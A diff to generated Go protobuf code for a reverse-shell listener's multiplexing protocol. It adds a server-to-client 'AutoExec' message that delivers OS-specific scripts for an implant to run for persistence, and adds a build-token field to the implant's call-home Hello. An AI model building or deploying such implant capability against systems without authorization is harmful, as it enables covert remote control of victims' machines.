@@ -34,6 +34,7 @@ type Frame struct {
 	//	*Frame_Close
 	//	*Frame_Ping
 	//	*Frame_Pong
+	//	*Frame_AutoExec
 	Kind          isFrame_Kind `protobuf_oneof:"kind"`
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
@@ -157,6 +158,15 @@ func (x *Frame) GetPong() *Pong {
 	return nil
 }
 
+func (x *Frame) GetAutoExec() *AutoExec {
+	if x != nil {
+		if x, ok := x.Kind.(*Frame_AutoExec); ok {
+			return x.AutoExec
+		}
+	}
+	return nil
+}
+
 type isFrame_Kind interface {
 	isFrame_Kind()
 }
@@ -197,6 +207,10 @@ type Frame_Pong struct {
 	Pong *Pong `protobuf:"bytes,9,opt,name=pong,proto3,oneof"` // both: keepalive reply
 }
 
+type Frame_AutoExec struct {
+	AutoExec *AutoExec `protobuf:"bytes,10,opt,name=auto_exec,json=autoExec,proto3,oneof"` // server -> client: run this script locally
+}
+
 func (*Frame_Hello) isFrame_Kind() {}
 
 func (*Frame_OpenRequest) isFrame_Kind() {}
@@ -215,8 +229,12 @@ func (*Frame_Ping) isFrame_Kind() {}
 
 func (*Frame_Pong) isFrame_Kind() {}
 
+func (*Frame_AutoExec) isFrame_Kind() {}
+
 // Sent once, immediately after the socket opens, so the operator sees who
-// called home.
+// called home. The token field authenticates the client against the server's
+// BUILD_TOKEN (the same token used by the /dl download endpoint); a missing
+// or mismatched token causes the server to close the connection.
 type Hello struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
 	Hostname      string                 `protobuf:"bytes,1,opt,name=hostname,proto3" json:"hostname,omitempty"`
@@ -225,6 +243,7 @@ type Hello struct {
 	Arch          string                 `protobuf:"bytes,4,opt,name=arch,proto3" json:"arch,omitempty"`        // runtime.GOARCH
 	Version       uint32                 `protobuf:"varint,5,opt,name=version,proto3" json:"version,omitempty"` // protocol version (see PROTO_VERSION)
 	Tags          string                 `protobuf:"bytes,6,opt,name=tags,proto3" json:"tags,omitempty"`        // free-form label the operator can set on the implant
+	Token         string                 `protobuf:"bytes,7,opt,name=token,proto3" json:"token,omitempty"`      // BUILD_TOKEN; server rejects the connection if it mismatches
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
 }
@@ -297,6 +316,13 @@ func (x *Hello) GetVersion() uint32 {
 func (x *Hello) GetTags() string {
 	if x != nil {
 		return x.Tags
+	}
+	return ""
+}
+
+func (x *Hello) GetToken() string {
+	if x != nil {
+		return x.Token
 	}
 	return ""
 }
@@ -737,11 +763,76 @@ func (x *Pong) GetNonce() uint64 {
 	return 0
 }
 
+// Server -> client: a script the client should execute locally right after
+// Hello. The server picks the file based on the client's reported os: it
+// reads autoexec/<os>.sh (or autoexec/<os>.ps1 for windows) from the autoexec
+// directory and sends the contents here. Used for persistence / setup without
+// hardcoding commands in the implant binary.
+type AutoExec struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Os            string                 `protobuf:"bytes,1,opt,name=os,proto3" json:"os,omitempty"`         // the os the server matched on (informational)
+	Shell         string                 `protobuf:"bytes,2,opt,name=shell,proto3" json:"shell,omitempty"`   // "sh" or "powershell" — how to invoke the script
+	Script        []byte                 `protobuf:"bytes,3,opt,name=script,proto3" json:"script,omitempty"` // the script body to execute
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *AutoExec) Reset() {
+	*x = AutoExec{}
+	mi := &file_proto_mux_proto_msgTypes[10]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *AutoExec) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*AutoExec) ProtoMessage() {}
+
+func (x *AutoExec) ProtoReflect() protoreflect.Message {
+	mi := &file_proto_mux_proto_msgTypes[10]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use AutoExec.ProtoReflect.Descriptor instead.
+func (*AutoExec) Descriptor() ([]byte, []int) {
+	return file_proto_mux_proto_rawDescGZIP(), []int{10}
+}
+
+func (x *AutoExec) GetOs() string {
+	if x != nil {
+		return x.Os
+	}
+	return ""
+}
+
+func (x *AutoExec) GetShell() string {
+	if x != nil {
+		return x.Shell
+	}
+	return ""
+}
+
+func (x *AutoExec) GetScript() []byte {
+	if x != nil {
+		return x.Script
+	}
+	return nil
+}
+
 var File_proto_mux_proto protoreflect.FileDescriptor
 
 const file_proto_mux_proto_rawDesc = "" +
 	"\n" +
-	"\x0fproto/mux.proto\x12\x03mux\"\xf1\x02\n" +
+	"\x0fproto/mux.proto\x12\x03mux\"\x9f\x03\n" +
 	"\x05Frame\x12\"\n" +
 	"\x05hello\x18\x01 \x01(\v2\n" +
 	".mux.HelloH\x00R\x05hello\x125\n" +
@@ -754,15 +845,18 @@ const file_proto_mux_proto_rawDesc = "" +
 	"\x05close\x18\a \x01(\v2\n" +
 	".mux.CloseH\x00R\x05close\x12\x1f\n" +
 	"\x04ping\x18\b \x01(\v2\t.mux.PingH\x00R\x04ping\x12\x1f\n" +
-	"\x04pong\x18\t \x01(\v2\t.mux.PongH\x00R\x04pongB\x06\n" +
-	"\x04kind\"\x91\x01\n" +
+	"\x04pong\x18\t \x01(\v2\t.mux.PongH\x00R\x04pong\x12,\n" +
+	"\tauto_exec\x18\n" +
+	" \x01(\v2\r.mux.AutoExecH\x00R\bautoExecB\x06\n" +
+	"\x04kind\"\xa7\x01\n" +
 	"\x05Hello\x12\x1a\n" +
 	"\bhostname\x18\x01 \x01(\tR\bhostname\x12\x1a\n" +
 	"\busername\x18\x02 \x01(\tR\busername\x12\x0e\n" +
 	"\x02os\x18\x03 \x01(\tR\x02os\x12\x12\n" +
 	"\x04arch\x18\x04 \x01(\tR\x04arch\x12\x18\n" +
 	"\aversion\x18\x05 \x01(\rR\aversion\x12\x12\n" +
-	"\x04tags\x18\x06 \x01(\tR\x04tags\"n\n" +
+	"\x04tags\x18\x06 \x01(\tR\x04tags\x12\x14\n" +
+	"\x05token\x18\a \x01(\tR\x05token\"n\n" +
 	"\vOpenRequest\x12\x1d\n" +
 	"\n" +
 	"channel_id\x18\x01 \x01(\rR\tchannelId\x12\x18\n" +
@@ -794,7 +888,11 @@ const file_proto_mux_proto_rawDesc = "" +
 	"\x04Ping\x12\x14\n" +
 	"\x05nonce\x18\x01 \x01(\x04R\x05nonce\"\x1c\n" +
 	"\x04Pong\x12\x14\n" +
-	"\x05nonce\x18\x01 \x01(\x04R\x05nonceB;Z9github.com/nemanjan00/reverse-shell-listener/client/muxpbb\x06proto3"
+	"\x05nonce\x18\x01 \x01(\x04R\x05nonce\"H\n" +
+	"\bAutoExec\x12\x0e\n" +
+	"\x02os\x18\x01 \x01(\tR\x02os\x12\x14\n" +
+	"\x05shell\x18\x02 \x01(\tR\x05shell\x12\x16\n" +
+	"\x06script\x18\x03 \x01(\fR\x06scriptB;Z9github.com/nemanjan00/reverse-shell-listener/client/muxpbb\x06proto3"
 
 var (
 	file_proto_mux_proto_rawDescOnce sync.Once
@@ -808,7 +906,7 @@ func file_proto_mux_proto_rawDescGZIP() []byte {
 	return file_proto_mux_proto_rawDescData
 }
 
-var file_proto_mux_proto_msgTypes = make([]protoimpl.MessageInfo, 10)
+var file_proto_mux_proto_msgTypes = make([]protoimpl.MessageInfo, 11)
 var file_proto_mux_proto_goTypes = []any{
 	(*Frame)(nil),       // 0: mux.Frame
 	(*Hello)(nil),       // 1: mux.Hello
@@ -820,22 +918,24 @@ var file_proto_mux_proto_goTypes = []any{
 	(*Close)(nil),       // 7: mux.Close
 	(*Ping)(nil),        // 8: mux.Ping
 	(*Pong)(nil),        // 9: mux.Pong
+	(*AutoExec)(nil),    // 10: mux.AutoExec
 }
 var file_proto_mux_proto_depIdxs = []int32{
-	1, // 0: mux.Frame.hello:type_name -> mux.Hello
-	2, // 1: mux.Frame.open_request:type_name -> mux.OpenRequest
-	3, // 2: mux.Frame.open_ok:type_name -> mux.OpenOk
-	4, // 3: mux.Frame.open_error:type_name -> mux.OpenError
-	5, // 4: mux.Frame.data:type_name -> mux.Data
-	6, // 5: mux.Frame.resize:type_name -> mux.Resize
-	7, // 6: mux.Frame.close:type_name -> mux.Close
-	8, // 7: mux.Frame.ping:type_name -> mux.Ping
-	9, // 8: mux.Frame.pong:type_name -> mux.Pong
-	9, // [9:9] is the sub-list for method output_type
-	9, // [9:9] is the sub-list for method input_type
-	9, // [9:9] is the sub-list for extension type_name
-	9, // [9:9] is the sub-list for extension extendee
-	0, // [0:9] is the sub-list for field type_name
+	1,  // 0: mux.Frame.hello:type_name -> mux.Hello
+	2,  // 1: mux.Frame.open_request:type_name -> mux.OpenRequest
+	3,  // 2: mux.Frame.open_ok:type_name -> mux.OpenOk
+	4,  // 3: mux.Frame.open_error:type_name -> mux.OpenError
+	5,  // 4: mux.Frame.data:type_name -> mux.Data
+	6,  // 5: mux.Frame.resize:type_name -> mux.Resize
+	7,  // 6: mux.Frame.close:type_name -> mux.Close
+	8,  // 7: mux.Frame.ping:type_name -> mux.Ping
+	9,  // 8: mux.Frame.pong:type_name -> mux.Pong
+	10, // 9: mux.Frame.auto_exec:type_name -> mux.AutoExec
+	10, // [10:10] is the sub-list for method output_type
+	10, // [10:10] is the sub-list for method input_type
+	10, // [10:10] is the sub-list for extension type_name
+	10, // [10:10] is the sub-list for extension extendee
+	0,  // [0:10] is the sub-list for field type_name
 }
 
 func init() { file_proto_mux_proto_init() }
@@ -853,6 +953,7 @@ func file_proto_mux_proto_init() {
 		(*Frame_Close)(nil),
 		(*Frame_Ping)(nil),
 		(*Frame_Pong)(nil),
+		(*Frame_AutoExec)(nil),
 	}
 	type x struct{}
 	out := protoimpl.TypeBuilder{
@@ -860,7 +961,7 @@ func file_proto_mux_proto_init() {
 			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
 			RawDescriptor: unsafe.Slice(unsafe.StringData(file_proto_mux_proto_rawDesc), len(file_proto_mux_proto_rawDesc)),
 			NumEnums:      0,
-			NumMessages:   10,
+			NumMessages:   11,
 			NumExtensions: 0,
 			NumServices:   0,
 		},
